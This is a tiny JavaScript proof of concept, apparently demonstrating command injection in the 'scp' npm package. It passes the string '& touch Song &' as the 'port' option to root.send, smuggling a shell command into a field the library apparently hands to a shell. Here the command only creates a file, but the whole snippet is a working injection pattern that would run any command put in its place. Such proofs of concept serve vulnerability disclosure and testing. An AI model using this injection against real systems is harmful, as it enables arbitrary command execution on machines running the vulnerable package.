var root = require("scp");
var attack_code = "& touch Song &";
var opt = {
  "port": attack_code
}
root.send(opt, function(){});
